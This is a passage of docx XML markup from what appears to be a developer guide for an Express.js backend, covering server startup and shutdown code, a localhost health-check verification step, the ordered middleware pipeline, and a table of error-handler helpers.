            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const app = express();</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app.get('/healthz', (req, res) =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  res.json({ ok: true, uptime: process.uptime(), env: env.NODE_ENV });</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const server = app.listen(env.PORT, () =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  logger.info({ port: env.PORT, env: env.NODE_ENV }, 'Server ready');</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function shutdown(signal) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  logger.info({ signal }, 'Shutdown signal received — closing HTTP server');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  server.close(() =&gt; process.exit(0));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  setTimeout(() =&gt; process.exit(1), 10_000).unref();</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t>process.on('SIGTERM', () =&gt; shutdown('SIGTERM'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>process.on('SIGINT',  () =&gt; shutdown('SIGINT'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>process.on('unhandledRejection', (reason) =&gt; logger.error({ reason }, 'Unhandled rejection'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>process.on('uncaughtException', (err) =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  logger.fatal({ err: { message: err.message, stack: err.stack } }, 'Uncaught exception');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  setTimeout(() =&gt; process.exit(1), 50);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>});</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.9  Verification Gate for STEP 1</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Terminal 1</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cd "SOFTWARE CODE/BE"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm install</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cp .env.example .env</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Generate two random JWT secrets and paste them into .env, then:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm run dev</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Expected log output (pretty-printed in dev)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[HH:MM:ss.lll] INFO: DB pool ready    host="localhost" db="final"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[HH:MM:ss.lll] INFO: Server ready      port=3000</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Terminal 2</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl http://localhost:3000/healthz</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → {"ok":true,"uptime":2.345,"env":"development"}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>STEP 1 acceptance</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Server boots and prints exactly TWO INFO log lines before listening.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/healthz returns ok:true with the running env.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Setting BOTH JWT secrets to the same value should make the process exit with the explicit FATAL message — that's the env.js safeguard working.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part III  ·  STEP 2  ·  Middleware Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Goal: install the 13-step request pipeline so that every future route inherits the same security headers, CORS rules, body parsers, request logging, and centralised error envelope. Once this step ships, adding a new module is just 'route → controller → service → repo' — the pipeline does the rest.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.1  The 13-Step Pipeline (Locked Order)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Express middleware runs in the order it is added. Order is not cosmetic — it is correctness. helmet must run before any handler because some headers (HSTS, CSP) need to be on the response regardless of who answers. cors must run before json because pre-flight OPTIONS requests carry no body. cookie-parser must run before any route that reads req.cookies. pino-http should be after the parsers so the per-request log line includes the parsed body shape (with secrets redacted by the logger).</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pipeline</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>incoming request</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1. helmet()             ← security headers</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 2. cors()               ← reject foreign origins</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 3. compression()        ← gzip JSON responses</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 4. express.json(1MB)    ← parse JSON body + 413 on overflow</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 5. cookie-parser()      ← req.cookies populated</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 6. pino-http()          ← per-request log + req.log</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> ── routers slot in here (auth, users, …) ──</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 7. rateLimit()          ← per-router (STEP 4)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 8. authenticate()       ← per-router (STEP 4)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 9. authorize()          ← per-route (STEP 4)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>10. rowLevelScope()      ← Phase 5+</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>11. validate(zodSchema)  ← per-route via factory</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>12. controller           ← the business handler</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>13. notFound + errorHandler  ← ALWAYS LAST</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outgoing response</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.2  src/middleware/errorHandler.js — The Safety Net</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every error that escapes a controller, service, repository, or other middleware lands here. Without this file Express would respond with a raw 500 + HTML stack trace — terrible for security (information leak) and useless for the frontend (no machine-readable code to react to). Three exports: AppError class, errors{} factory, notFoundHandler — with the default export being the error-handler function itself.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Error envelope contract (locked, frozen)</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json</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{ "error": { "code": "FORBIDDEN", "message": "...", "details": null } }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Factory helpers and what they emit</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>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Helper</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>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HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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code field</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Used by</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errors.badRequest(msg, details)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>400</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>BAD_REQUEST</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Future modules — JSON parse errors caught separately</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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errors.unauthorized(msg='Authentication required')</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="85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401</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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UNAUTHORIZED</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authenticate, auth.service login/refresh failures</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errors.forbidden(msg='Insufficient permissions')</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>403</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>FORBIDDEN</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authorize, CSRF mismatch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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errors.notFound(msg='Resource not found')</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="85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404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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NOT_FOUND</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notFoundHandler + future modules</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errors.conflict(msg, details)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>409</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CONFLICT</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Phase 5+ uniqueness violations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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errors.tooManyRequests(msg='Rate limit exceeded')</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>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429</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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RATE_LIMITED</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express-rate-limit handler hook</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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errors.internal(msg='Internal server error')</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
